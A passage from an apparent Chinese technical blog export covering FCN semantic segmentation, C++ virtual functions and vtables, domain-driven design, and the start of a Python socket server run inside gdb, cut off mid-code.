<p>2014年论文：<a href="https://arxiv.org/abs/1411.4038">Fully Convolutional Networks for Semantic Segmentation</a>，是将深度学习用于图像语义分割的开山之作。</p>
<p>在VGG、AlexNet等CNN网络的基础上，用卷积层代替全连接层，并使用转置卷积进行向上采样，使得网络的输出不再是类别，而是 <code>heat map</code>，即 <code>end-to-end</code> 的网络。</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/6.png" alt="FCN"></p>
<h4 id="2-1-1-转置卷积"><a href="#2-1-1-转置卷积" class="headerlink" title="2.1.1. 转置卷积"></a>2.1.1. 转置卷积</h4><p>参考：</p>
<ul>
<li><a href="https://github.com/vdumoulin/conv_arithmetic">Github: Convolution arithmetic（各种卷积、反卷积示意图）</a></li>
<li><a href="https://www.zhihu.com/question/43609045">如何理解深度学习中的deconvolution networks？</a></li>
<li><a href="https://www.zhihu.com/question/48279880">怎样通俗易懂地解释反卷积？</a></li>
</ul>
<p>一种向上采样的方法。其原理：对于卷积操作 $y &#x3D; Cx$，$x$ 是输入图像（一维），$y$ 是输出图像（一维），$C$ 是参数（权值）矩阵；那么转置卷积操作则是 $x &#x3D; C^T y$。</p>
<p>举例，4x4的输入，滤波器<code>filter</code>为3x3，没有Padding &#x2F; Stride，卷积操作后输出为2x2。</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/2.gif" alt="FCN"></p>
<p>那么，$C$ 如下所示（$w_{i,j}$ 表示<code>filter</code>种第i行第j列的权值）：</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/11.png" alt="FCN"></p>
<p>转置卷积操作 $x &#x3D; C^T y$ 则如下所示（建议在纸上写出 $C^T$，就明白了）：</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/1.gif" alt="FCN"></p>
<p>转置卷积的使用：</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/7.png" alt="FCN"></p>
<h4 id="2-1-2-性能指标"><a href="#2-1-2-性能指标" class="headerlink" title="2.1.2. 性能指标"></a>2.1.2. 性能指标</h4><p>参考：<a href="https://blog.csdn.net/baidu_27643275/article/details/90445422">语义分割评估指标mIOU</a></p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/8.png" alt="FCN"></p>
<p>其中，<code>mean IU(Mean Intersection over Union, MIoU)</code> 均交并比，是语义分割最常用的标准度量。其公式如下：</p>
<p>$\frac{1}{n_{cl}} \displaystyle\sum_{i&#x3D;0}^{n_{cl}} \frac{n_{ii}}{\displaystyle\sum_{j&#x3D;0}^{n_{cl}} n_{ij} + \displaystyle\sum_{j&#x3D;0}^{n_{cl}} n_{ji} - n_{ii}}$</p>
<ul>
<li>$n_{cl}$：像素点的数量。</li>
<li>$n_{ii}$：真实值是i，预测值也是i。</li>
<li>$n_{ij}$：真实值是i，预测值是j。</li>
<li>$n_{ji}$：真实值是j，预测值是i。</li>
</ul>
<p>如下图，<code>MIoU</code> 为两圆交集与两圆并集之间的比例，理想情况下两圆重合，比例为1。</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/9.png" alt="FCN"></p>
<p>一个例子如下：</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/10.png" alt="FCN"></p>
<h4 id="2-1-3-转置卷积（解码）后的输出"><a href="#2-1-3-转置卷积（解码）后的输出" class="headerlink" title="2.1.3. 转置卷积（解码）后的输出"></a>2.1.3. 转置卷积（解码）后的输出</h4><p>FCN 语义分割最后是对像素进行分类, 有多少类最后的输出图像就有多少个通道, 每个通道的像素值代表了这个通道的像素应划分到哪一个类别的概率, 如果某一个像素位置在第 3 通道的值最大, 那这个位置的像素就属于第 3 个分类。</p>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>语义分割</tag>
      </tags>
  </entry>
  <entry>
    <title>理解C++虚函数</title>
    <url>/%E7%90%86%E8%A7%A3C++%E8%99%9A%E5%87%BD%E6%95%B0.html</url>
    <content><![CDATA[<h2 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1. 简单介绍"></a>1. 简单介绍</h2><p>C++虚函数是定义在基类中的函数，子类必须对其进行<a href="conceptUnderstand/C-%E9%87%8D%E8%BD%BD%E4%B8%8E%E8%A6%86%E7%9B%96.html">覆盖</a>。在类中声明（无函数体的形式叫做声明）虚函数的格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">virtual <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="2-虚函数的作用"><a href="#2-虚函数的作用" class="headerlink" title="2. 虚函数的作用"></a>2. 虚函数的作用</h2><p>虚函数有两大作用：</p>
<p>（1）定义子类对象，并调用对象中未被子类覆盖的基类函数A。同时在该函数A中，又调用了已被子类覆盖的基类函数B。那此时将会调用基类中的函数B，可我们本应该调用的是子类中的覆盖函数B。虚函数即能解决这个问题。</p>
<p>以下是没有使用虚函数的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基类 Father</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Father::display()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在函数中调用了，子类覆盖基类的函数display()</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">fatherShowDisplay</span><span class="params">()</span> &#123;</span><br><span class="line">        display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类Son</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>:</span>public Father &#123;</span><br><span class="line">public:</span><br><span class="line">    <span class="comment">// 重写基类中的display()函数</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Son::display()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Son son;                    <span class="comment">// 子类对象</span></span><br><span class="line">    son.fatherShowDisplay();    <span class="comment">// 通过基类中未被覆盖的函数，想调用子类中覆盖的display函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该例子的运行结果是： <code>Father::display()</code></p>
<p>以下是使用虚函数的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基类 Father</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    virtual <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Father::display()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在函数中调用了，子类覆盖基类的函数display()</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">fatherShowDisplay</span><span class="params">()</span> &#123;</span><br><span class="line">        display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类Son</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>:</span>public Father &#123;</span><br><span class="line">public:</span><br><span class="line">    <span class="comment">// 重写基类中的display()函数</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Son::display()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Son son;                    <span class="comment">// 子类对象</span></span><br><span class="line">    son.fatherShowDisplay();    <span class="comment">// 通过基类中未被覆盖的函数，想调用子类中覆盖的display函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该例子的运行结果是： <code>Son::display()</code></p>
<p>（2）在使用<strong>指向子类对象的基类指针，并调用子类中的覆盖函数</strong>时，如果该函数不是虚函数，那么将调用基类中的该函数；如果该函数是虚函数，则会调用子类中的该函数。</p>
<p>以下是没有使用虚函数的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基类 Father</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Father::display()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类Son</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>:</span>public Father &#123;</span><br><span class="line">public:</span><br><span class="line">    <span class="comment">// 覆盖基类中的display函数</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Son::display()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Father *fp;     <span class="comment">// 定义基类指针</span></span><br><span class="line">    Son son;        <span class="comment">// 子类对象</span></span><br><span class="line">    fp=&amp;son;        <span class="comment">// 使基类指针指向子类对象</span></span><br><span class="line">    fp-&gt;display();  <span class="comment">// 通过基类指针想调用子类中覆盖的display函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该例子的运行结果是： <code>Father::display()</code><br>结果说明，通过指向子类对象的基类指针调用子类中的覆盖函数是不能实现的，因此虚函数应运而生。</p>
<p>以下是使用虚函数的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基类 Father</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    <span class="comment">// 定义了虚函数</span></span><br><span class="line">    <span class="type">void</span> virtual <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Father::display()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类Son</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>:</span>public Father &#123;</span><br><span class="line">public:</span><br><span class="line">    <span class="comment">// 覆盖基类中的display函数</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Son::display()\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Father *fp;     <span class="comment">// 定义基类指针</span></span><br><span class="line">    Son son;        <span class="comment">// 子类对象</span></span><br><span class="line">    fp=&amp;son;        <span class="comment">// 使基类指针指向子类对象</span></span><br><span class="line">    fp-&gt;display();  <span class="comment">// 通过基类指针想调用子类中覆盖的display函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该例子的运行结果是： <code>Son::display()</code></p>
<h2 id="3-虚函数的实际意义"><a href="#3-虚函数的实际意义" class="headerlink" title="3. 虚函数的实际意义"></a>3. 虚函数的实际意义</h2><p>或许，很多小伙伴都会有这样一个疑问：如果想调用子类中的覆盖函数，直接通过子类对象，或者指向子类对象的子类指针来调用，不就没这个烦恼了吗？要虚函数还有什么用呢？</p>
<p>其实不然，虚函数的实际意义非常之大。比如在实际开发过程中，会用到别人封装好的框架和类库，我们可以通过继承其中的类，并覆盖基类中的函数，来实现自定义的功能。</p>
<p>但是，有些函数是需要框架来调用，并且API需要传入基类指针类型的参数。而使用虚函数就可以，将指向子类对象的基类指针来作为参数传入API，让API能够通过基类指针，来调用我们自定义的子类函数。这就是多态性的真正体现。</p>
<h2 id="4-浅谈虚函数的原理"><a href="#4-浅谈虚函数的原理" class="headerlink" title="4. 浅谈虚函数的原理"></a>4. 浅谈虚函数的原理</h2><p>参考：<a href="https://blog.twofei.com/496/">C++中的虚函数(表)实现机制以及用C语言对其进行的模拟实现</a></p>
<p>虚函数的本质是一个简单的<strong>虚函数表</strong>。</p>
<p>当一个类存在虚函数时，通过该类创建的对象实例，会在内存空间的前4字节保存一个指向虚函数表的指针<code>__vfptr</code>。</p>
<p><code>__vfptr</code>指向的虚函数表，是<strong>类独有的</strong>，而且被该<strong>类的所有对象共享</strong>。虚函数表的实质，是一个虚函数地址的数组，它包含了类中每个虚函数的地址，既有当前类定义的虚函数，也有覆盖父类的虚函数，也有继承而来的虚函数。</p>
<p>当子类覆盖了父类的虚函数时，子类虚函数表将包含子类虚函数的地址，而不会有父类虚函数的地址。</p>
<p>同时，当用基类指针指向子类对象时，基类指针指向的内存空间中的<code>__vfptr</code>依旧指向了子类的虚函数表。所以，基类指针依旧会调用子类的虚函数。</p>
<p>见如下示例：</p>
<h3 id="4-1-自己定义了虚函数的类"><a href="#4-1-自己定义了虚函数的类" class="headerlink" title="4.1. 自己定义了虚函数的类"></a>4.1. 自己定义了虚函数的类</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> base1_1;</span><br><span class="line">    <span class="type">int</span> base1_2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">base1_fun1</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">base1_fun2</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>定义两个对象：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Base1 b1;</span><br><span class="line">Base1 b2;</span><br></pre></td></tr></table></figure>

<p>两个对象的内存空间分配如下：</p>
<p><img src="/%E7%90%86%E8%A7%A3C++%E8%99%9A%E5%87%BD%E6%95%B0/1.png" alt="pic"></p>
<h3 id="4-2-既包含覆盖虚函数，又包含继承虚函数的类"><a href="#4-2-既包含覆盖虚函数，又包含继承虚函数的类" class="headerlink" title="4.2. 既包含覆盖虚函数，又包含继承虚函数的类"></a>4.2. 既包含覆盖虚函数，又包含继承虚函数的类</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> base1_1;</span><br><span class="line">    <span class="type">int</span> base1_2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">base1_fun1</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">base1_fun2</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derive1</span> : <span class="keyword">public</span> Base1 &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> derive1_1;</span><br><span class="line">    <span class="type">int</span> derive1_2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 覆盖基类函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">base1_fun1</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>定义一个子类对象：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Derive1 d1;</span><br></pre></td></tr></table></figure>

<p>其内存空间如下：</p>
<p><img src="/%E7%90%86%E8%A7%A3C++%E8%99%9A%E5%87%BD%E6%95%B0/2.png" alt="pic"></p>
<p>由图可以看出：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Base1 *b_p = &amp;d1;     <span class="comment">// 指向子类对象的基类指针</span></span><br><span class="line">b_p-&gt;<span class="built_in">base1_fun1</span>();    <span class="comment">// 调用子类虚函数</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈领域驱动设计DDD</title>
    <url>/%E6%B5%85%E8%B0%88%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1DDD.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>实习期间，组长布置的作业。</p>
<span id="more"></span>

<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>2003年，<code>Eric Evans</code> 在 <code>《Domain-Driven Design: Tackling Complexity in the Heart of Software》</code> 一书中提出了 <strong>领域驱动设计（DDD）</strong> 的重要概念。</p>
<p>如果说 DevOps 是一种软件开发过程的方法，那 DDD 就是一种软件架构设计的方法。</p>
<p>DDD 本质是面向对象分析的方法论，它的革命性在于：利用面向对象的特性，<strong>以业务为核心驱动，而不是传统的数据库驱动开发</strong>；同时，不同于传统的<strong>贫血模型</strong>，它提倡<strong>充血模型</strong>。</p>
<p>此处先简单介绍一下贫血模型和充血模型：</p>
<h3 id="1-1-贫血模型"><a href="#1-1-贫血模型" class="headerlink" title="1.1. 贫血模型"></a>1.1. 贫血模型</h3><p>贫血模型最广泛的应用，应该是在 <code>Spring</code> 框架中，也就是我们常见的 <code>controller/service/model/dao</code> 分层。</p>
<p>这种模型的特点在于：</p>
<ul>
<li>数据和DB操作分离；</li>
<li>我们在 model 中只实现 getter、setter 方法，而将业务逻辑交给 service 层实现。</li>
</ul>
<p>可以看出，这种模型的缺点在于：</p>
<ul>
<li>它将本该聚集在 model 中的业务逻辑泄漏到了 service 中，导致 model 只是一个存放数据的容器，丧失了面向对象的抽象性，其本质依然是一种面向过程的编程；</li>
<li>而且随着项目的演进，sevice 层会十分沉重，业务逻辑会分散到不同的 service 中，代码变得越来越难以理解，并丧失扩展性。</li>
</ul>
<h3 id="1-2-充血模型"><a href="#1-2-充血模型" class="headerlink" title="1.2. 充血模型"></a>1.2. 充血模型</h3><p>贫血模型的对立面自然就是充血模型了。</p>
<p>充血模型，提倡将业务逻辑放入 model （领域模型）中，遵循面向对象原则，每个 model 负责自己的业务逻辑。</p>
<p>体现在项目结构中，即是根据业务进行分包。比如：一个订单系统中，最重要的 model 是 product 和 order ，那么项目顶层应该是 <code>product</code> 和 <code>order</code> 两个包，而不是 <code>controller/service/model/dao</code> 等。</p>
<h2 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2. 基本概念"></a>2. 基本概念</h2><p>领域驱动设计DDD主要包含两方面：<strong>战略设计</strong>和<strong>战术设计</strong>。</p>
<p>战略设计偏向于软件架构，主要关注的是领域和边界上下文的划分。而战术设计偏向于编码实现，主要关注如何用代码实现该领域模型。</p>
<p>通过这两个方面，我们可以更好地理解什么是领域驱动设计：</p>
<ol>
<li><strong>领域驱动领域模型的设计</strong>；</li>
<li><strong>领域模型驱动代码的实现</strong>。</li>
</ol>
<h3 id="2-1-战略设计"><a href="#2-1-战略设计" class="headerlink" title="2.1. 战略设计"></a>2.1. 战略设计</h3><p>先简单介绍战略设计中的部分概念：</p>
<ul>
<li><p><strong>领域</strong>：是一种划分，比如：电商平台属于电商领域、金融平台属于金融领域。当然，每个大领域下，还会有许多小领域，比如电商领域下还有：商品、订单、库存、会员等领域。</p>
</li>
<li><p><strong>领域专家</strong>：要想理解某个领域的知识，那么我们得找一个对该领域十分熟悉的人，那这个人就叫做领域专家。</p>
</li>
<li><p><strong>领域通用语言</strong>：有时候领域专家并不一定是软件开发人员，那么为了方便软件人员与领域人员的交流，就要规定一门领域通用语言。</p>
</li>
</ul>
<p>在战略设计中，一旦系统的主要目标确定，那我们首先就要理解领域知识，让自己成为领域专家；其次，对于一个大领域，我们还需要将其划分成多个小领域；最后，我们还必须再进一步细化每个子领域，比如：明确每个子领域的核心关注点、每个领域之间的关系等。</p>
<p>战略设计就相当于软件开发过程中的需求分析阶段，但DDD更关注于业务而不是数据。</p>
<h3 id="2-2-战术设计"><a href="#2-2-战术设计" class="headerlink" title="2.2. 战术设计"></a>2.2. 战术设计</h3><p>当战略设计完大致的领域模型后，就该进行战术建模了。</p>
<p>依旧先简单介绍领域模型中的部分概念：</p>
<ul>
<li><strong>实体</strong>：具有生命周期和唯一标识的对象。例如：人就是一个实体，每个人都具有唯一标识（身份证）。</li>
<li><strong>值对象</strong>：用于对事务描述而没有唯一标识的对象。例如：颜色信息、地址信息等。</li>
<li><strong>聚合</strong>：一些对象的集合，这些对象之间具有高聚合的关系，它们作为一个整体被外界访问，<strong>聚合应该尽可能小</strong>。</li>
<li><strong>聚合根（Aggreate Root）</strong>：聚合中最主要的对象，例如：会员管理系统，会员便是一个聚合根。同时，聚合根是业务逻辑的主要载体。</li>
<li><strong>领域服务</strong>：一些不能归属到任一对象的业务逻辑。</li>
<li><strong>仓库（Repository）</strong>：将领域模型中的对象持久化到数据库中。</li>
</ul>
<p>结合上述概念，战术设计的大致步骤为：</p>
<ol>
<li>分析领域模型，从中找出实体、值对象、领域服务；</li>
<li>找出聚合边界和聚合根；</li>
<li>为聚合配备仓库；</li>
<li>在工程中实践领域模型，并在实践中检验模型的合理性，倒推模型中不足的地方并重构；</li>
</ol>
<p>在这过程中，还需要考虑软件设计原则及性能。</p>
<p>当领域建模大致完成后，就需要对系统进行分层架构了。DDD中有如下的经典分层架构：</p>
<p><img src="/%E6%B5%85%E8%B0%88%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1DDD/1.png" alt="1"></p>
<ul>
<li>用户接口层：主要用于向用户展示信息，并接受用户指令。</li>
<li>应用层：相当于 controller 层，对外提供接口，对内调用领域层，不包含业务逻辑，是领域模型的门面。</li>
<li>领域层：核心层，领域模型所在之处。</li>
<li>基础设施层：为其他层提供通用的技术能力，如：层间的通信、持久化机制等。</li>
</ul>
<p>在领域层中，包含着系统中的各领域模型，它们以单独的模块存在，相互之间高内聚低耦合。同时，它们也是上文所提到的充血模型。</p>
<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>传统的软件开发习惯，总是从设计数据表开始的，而且大多都采用 <code>controller/service/model/dao</code> 的分层结构，我之前所接触到的项目，基本都是如此。</p>
<p>这种设计开发模式，最大的问题便在于：一旦前期数据表设计不合理，后期的改动则会非常大。</p>
<p>而领域驱动设计最大的优势便在于：<strong>软件设计初期关注的是业务，而不是数据表</strong>，数据持久化只是设计后期的一个考虑。</p>
<p>就像<a href="https://juejin.im/entry/6844903553824194574">阿里盒马领域驱动设计实践</a>博客中作者所说的：</p>
<blockquote>
<p>假设你的机器内存无限大，永远不宕机，在这个前提下，我们是不需要持久化数据的，也就是我们可以不需要数据库，那么你将会怎么设计你的软件？</p>
</blockquote>
<p>脱离了数据库的束缚，面向对象、设计模式等方法是不是可以大展身手了呢？</p>
<p>同时，领域驱动设计所带来的领域划分方法，也与今天的微服务相得益彰。</p>
<p>DDD所提倡的基于业务设计、面向对象分析、基于子领域分治等思想，还是值得借鉴的。</p>
<p>但是我认为，DDD的实践也存在着一些问题，比如：</p>
<ul>
<li>领域建模得到的充血模型，业务逻辑函数集聚在一个聚合根对象中，是否会导致该对象过于臃肿？</li>
<li>子领域中，面向对象的设计是否会导致问题复杂化，面向过程是否更加快捷方便，特别是像go这种不擅长面向对象的语言？</li>
<li>实体对象如何高效地跟数据库衔接，如何进行复杂的查询？</li>
</ul>
<p>俗话说，没有最好的只有最合适的。领域驱动设计只是一个流派，并非完美无缺，很多问题可能在实践中才会真正显露出来。就像微服务一样，虽然带来了高内聚低耦合等好处，但也增加了系统的复杂性、带来了服务管理和监控等问题。</p>
<p>在DDD具体的实践中，还需要我们灵活应变。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.cnblogs.com/netfocus/p/5548025.html#!comments">浅谈我对DDD领域驱动设计的理解</a></li>
<li><a href="https://www.cnblogs.com/netfocus/archive/2011/10/10/2204949.html">DDD领域驱动设计基本理论知识总结</a></li>
<li><a href="https://juejin.im/entry/6844903553824194574">阿里盒马领域驱动设计实践</a></li>
<li><a href="https://tech.meituan.com/2017/12/22/ddd-in-practice.html">领域驱动设计在互联网业务开发中的实践</a></li>
<li><a href="https://www.zhihu.com/question/25089273">领域驱动架构（DDD）建模中的模型到底是什么？</a></li>
<li><a href="https://insights.thoughtworks.cn/backend-development-ddd/">后端开发实践系列——领域驱动设计(DDD)编码实践</a></li>
</ul>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>软件工程</category>
      </categories>
      <tags>
        <tag>软件工程</tag>
        <tag>DDD</tag>
      </tags>
  </entry>
  <entry>
    <title>用python在gdb中实现一个简单服务器</title>
    <url>/%E7%94%A8python%E5%9C%A8gdb%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
    <content><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p><code>gdb</code>是一个十分强大的调试器，而它又提供给<code>python</code>扩展的<code>gdb</code>模块。但是，该模块只有在<code>gdb</code>中，才能被成功导入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br></pre></td></tr></table></figure>

<p>运行上述代码，报错显示没有<code>gdb</code>模块。因为只有在<code>gdb</code>加载该<code>python</code>文件时，才能运行成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) source xxx.py</span><br></pre></td></tr></table></figure>

<p>为了解决这个问题，可以利用<code>python</code>语言的强大，通过<code>socket</code>套接字编写，在<code>gdb</code>中开启一个服务器，从而到达外界与<code>gdb</code>之间的交互。</p>
<span id="more"></span>

<h3 id="1-代码示例"><a href="#1-代码示例" class="headerlink" title="1. 代码示例"></a>1. 代码示例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP服务端</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建一个socket对象，AF_INET指定使用IPv4协议(AF_INET6代表IPV6)，SOCK_STREAM指定使用面向流的TCP协议</span></span><br><span class="line">    tcp_serve_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    tcp_serve_socket.bind((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8001</span>))   <span class="comment"># 绑定本地ip和端口</span></span><br><span class="line">    tcp_serve_socket.listen(<span class="number">128</span>)                <span class="comment"># 开始监听端口，数字表示等待连接的最大数量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环目的：多次调用accept为多个客户服务</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;等待一个新请求到来....&#x27;</span>)</span><br><span class="line">        tcp_client_socket, client_addr = tcp_serve_socket.accept()</span><br><span class="line">        